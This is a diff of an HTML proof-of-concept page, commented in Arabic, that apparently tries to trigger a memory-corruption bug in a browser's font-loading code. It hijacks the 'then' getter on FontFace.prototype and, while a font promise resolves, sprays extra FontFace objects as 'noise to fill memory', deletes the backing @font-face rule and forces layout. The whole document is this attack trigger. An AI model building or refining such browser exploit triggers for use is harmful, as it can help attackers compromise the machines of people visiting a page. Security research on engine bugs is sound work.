@@ -1,41 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style id="s">
-        @font-face { font-family: 'x'; src: url(data:font/woff2;base64,d09GMgABAAAAA); }
-    </style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
 </head>
 <body>
-    <div id="debug" style="color: #0f0; font-family: monospace;">Initiating...</div>
+<div id="debug" style="color:red; font-family:monospace;">Waiting...</div>
+<script>
+window.onload = () => {
+    const debug = document.getElementById('debug');
+    debug.innerText = "Script Loaded.";
 
-    <script>
-        const debug = document.getElementById('debug');
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    // void A.loaded هي التي تضمن أن المحرك بدأ في معالجة الكائن
+    void A.loaded;
 
-        function trigger() {
-            let A = new FontFace('x', 'url(data:font/woff2;base64,d09GMgABAAAAA)');
-            document.fonts.add(A);
-
-            // نستخدم Proxy بدلاً من التعديل المباشر
-            // Proxy يعطينا سيطرة أكبر على العمليات التي يقوم بها المحرك على الكائن
-            let handler = {
-                get(target, prop, receiver) {
-                    if (prop === 'status') {
-                        // هنا نغير الـ status يدوياً لتخريب المنطق الداخلي
-                        document.getElementById('s').sheet.deleteRule(0);
-                    }
-                    return Reflect.get(...arguments);
-                }
-            };
-            let proxyA = new Proxy(A, handler);
-
-            A.load().then(() => {
-                debug.innerText = "Done!";
-            }).catch((e) => {
-                debug.innerText = "Caught: " + e.message;
-            });
+    let fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (!fired && this === A) {
+                fired = true;
+                debug.innerText = "HOOK TRIGGERED!";
+                
+                // هذه هي الضوضاء التي تملأ الذاكرة
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop; // الـ Trigger الحقيقي
+            }
+            return undefined;
         }
+    });
 
-        setTimeout(trigger, 1000);
-    </script>
+    document.fonts.load('1em x', 'AB').then(() => {
+        debug.innerText = "Load Completed (Stable)";
+    }).catch((e) => {
+        debug.innerText = "Load Failed (Caught Error)";
+    });
+};
+</script>
 </body>
 </html>
